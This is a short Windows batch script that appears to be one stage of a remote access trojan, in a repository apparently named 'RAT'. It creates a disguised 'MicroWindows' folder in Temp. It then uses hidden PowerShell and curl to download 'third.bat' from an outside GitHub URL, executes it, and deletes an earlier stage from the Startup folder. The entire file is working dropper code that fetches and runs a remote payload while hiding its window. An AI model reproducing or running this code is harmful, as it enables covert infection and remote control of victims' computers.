@echo off
set "currentd=%cd%"

mkdir C:\Users\%username%\AppData\Local\Temp\MicroWindows
powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/third.bat -o C:/Users/%username%/AppData/Local/Temp/MicroWindows/third.bat


cd C:\Users\%username%\AppData\Local\Temp\MicroWindows
cmd /c third.bat
cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
del secondary.bat